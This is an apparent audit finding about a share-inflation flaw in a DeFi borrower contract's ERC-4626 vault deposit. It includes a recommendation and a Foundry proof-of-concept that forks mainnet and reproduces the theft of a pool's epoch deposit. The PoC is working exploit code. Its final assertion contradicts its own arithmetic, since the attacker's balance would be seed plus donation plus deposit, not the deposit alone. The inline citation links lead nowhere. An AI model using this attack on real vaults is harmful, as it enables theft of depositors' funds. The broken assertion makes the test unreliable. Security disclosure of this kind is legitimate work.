### Title
Unvalidated ERC-4626 deposit lets a vault depositor steal epoch principal through share inflation - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower` treats `vault.deposit()` as a trusted accounting boundary but does not verify that the deposit returned shares or preserved the deposited asset value. [1](#0-0)  A depositor in the configured ERC-4626 vault can inflate its assets-per-share before `onStartEpoch`, causing the borrower’s pool deposit to mint zero shares while the underlying is transferred to the vault. [2](#0-1)  The attacker then redeems their pre-existing shares and receives both the donated assets and the pool deposit, directly stealing the epoch principal.

### Finding Description

The epoch-start hook snapshots the borrower’s current on-hand plus vault assets, deposits all on-hand underlying into the configured ERC-4626 vault, and records the pre-deposit amount as `epochStartVaultAssets`. [3](#0-2)  `_depositToVault` calls the external vault and ignores the returned share amount except for emitting it in an event. [1](#0-0) 

An attacker holding vault shares can first donate enough underlying to the vault that the victim deposit is rounded down to zero shares. Because `ProgrammableBorrower` never checks `shares != 0`, compares minted shares with `previewDeposit`, or enforces a minimum shares-out value, the loss is silently accepted. [1](#0-0) 

The later accounting conversion uses `vault.convertToAssets(vault.balanceOf(address(this)))`. [4](#0-3)  If the deposit minted zero shares, `_currentVaultAssets()` remains zero even though the pool’s assets are now held by the external vault. `_vaultNetInterest()` therefore records the stolen deposit as a vault loss. [5](#0-4) 

At epoch stop, `onStopEpoch` sees insufficient economically-backed assets and returns success when the requested shortfall exceeds `_currentVaultAssets()`. [6](#0-5)  `IdleCDOEpochVariant.stopEpoch` then attempts to pull funds, the transfer fails, and the catch path treats the missing principal as a borrower default rather than identifying the external-vault deposit failure. [7](#0-6) [8](#0-7) 

### Impact Explanation

For a pool deposit `P`, attacker donation `D`, and attacker-controlled share supply `S`, a vulnerable vault mints approximately `P * S / (D + existingAssets)` shares. If `D + existingAssets > P * S`, the deposit mints zero shares. The attacker redeems `S` shares for approximately `D + existingAssets + P`, recovering their donation and original assets while gaining `P`.

The resulting vault loss is passed through `totalInterestDueNow()` and the epoch settlement path, so LP principal becomes unrecoverable or must be processed through the default-recovery waterfall. [9](#0-8) [8](#0-7)  This breaks the solvency and fair-mint invariant: pool assets were transferred out, but the borrower adapter received no claim on them.

### Likelihood Explanation

The attacker only needs to be an ordinary depositor in the configured ERC-4626 vault and must act before the manager starts an epoch. No borrower, owner, manager, or other privileged actor needs to cooperate after deployment.

The exploit requires the configured vault to be susceptible to share-price inflation through direct asset transfers and deposit rounding. `setVault` validates only that the vault asset matches `underlyingToken` and does not require a minimum share supply, share-price bounds, donation resistance, or a deposit preview/slippage check. [10](#0-9) 

### Recommendation

Do not call ERC-4626 `deposit` without validating its economic result. At minimum, `_depositToVault` should require `shares != 0`, require `shares >= minSharesOut`, and reject deposits whose `convertToAssets(shares)` deviates from `_assetAmount` beyond an explicitly bounded rounding amount. [1](#0-0) 

The vault integration should additionally require a vault with inflation-resistant exchange-rate accounting or enforce minimum initial liquidity and maximum accepted price deviation. `setVault` should validate that the vault has nonzero economically-backed supply before activation, rather than checking only the asset address. [10](#0-9) 

### Proof of Concept

The following Foundry test can be placed in `test/foundry/ProgrammableBorrowerInflation.t.sol`. It starts from a mainnet fork, deploys the production `ProgrammableBorrower`, and uses an ERC-4626-compatible vault with naive `deposit` rounding to reproduce the externally exploitable share-inflation path.

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";
import {ProgrammableBorrower} from
  "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflatableVault is ERC20 {
  IERC20Detailed public immutable assetToken;

  constructor(address asset_) ERC20("Inflatable Vault", "IVLT") {
    assetToken = IERC20Detailed(asset_);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return shares;
    return shares * assetToken.balanceOf(address(this)) / supply;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();

    // Vulnerable ERC-4626-style rounding: a donation can make this zero.
    shares = supply == 0 || assetsBefore == 0
      ? assets
      : assets * supply / assetsBefore;

    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256 shares)
  {
    shares = assets * totalSupply() / assetToken.balanceOf(address(this));
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }
}

contract ProgrammableBorrowerInflationTest is Test {
  address internal constant USDC =
    0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  address internal constant USDC_WHALE =
    0x55FE002aefF02F77364de339a1292923A15844B8;

  address internal attacker = makeAddr("attacker");
  address internal idleCDO = makeAddr("idleCDO");
  address internal owner = makeAddr("owner");
  address internal manager = makeAddr("manager");
  address internal borrower = makeAddr("borrower");

  IERC20Detailed internal usdc = IERC20Detailed(USDC);
  InflatableVault internal vault;
  ProgrammableBorrower internal programmableBorrower;

  function test_attacker_steals_epoch_deposit_through_vault_inflation() public {
    vm.createSelectFork("mainnet", 19_225_935);

    vault = new InflatableVault(USDC);
    ProgrammableBorrower implementation = new ProgrammableBorrower();
    programmableBorrower = ProgrammableBorrower(address(
      new TransparentUpgradeableProxy(
        address(implementation),
        makeAddr("proxyAdmin"),
        abi.encodeWithSelector(
          ProgrammableBorrower.initialize.selector,
          address(vault),
          idleCDO,
          owner,
          manager,
          borrower,
          365e18
        )
      )
    ));

    uint256 attackerSeed = 1;
    uint256 donation = 2_000_000e6;
    uint256 poolDeposit = 1_000_000e6;

    deal(USDC, attacker, attackerSeed + donation);
    vm.startPrank(attacker);
    usdc.approve(address(vault), type(uint256).max);

    // Attacker creates the initial share supply.
    vault.deposit(attackerSeed, attacker);

    // Donation inflates assets/share so poolDeposit mints zero shares.
    usdc.transfer(address(vault), donation);
    vm.stopPrank();

    // IdleCDO sends the pool's epoch capital to the borrower adapter.
    deal(USDC, address(programmableBorrower), poolDeposit);

    // Production hook deposits all idle assets without a minSharesOut check.
    vm.prank(idleCDO);
    programmableBorrower.onStartEpoch(0);

    assertEq(vault.balanceOf(address(programmableBorrower)), 0);
    assertEq(usdc.balanceOf(address(programmableBorrower)), 0);

    // The attacker redeems the sole share and receives donation + poolDeposit + seed.
    uint256 attackerBefore = usdc.balanceOf(attacker);
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    assertEq(
      usdc.balanceOf(attacker) - attackerBefore,
      attackerSeed + donation + poolDeposit
    );

    // Net attacker profit is the pool deposit.
    assertEq(usdc.balanceOf(attacker), poolDeposit);
  }
}
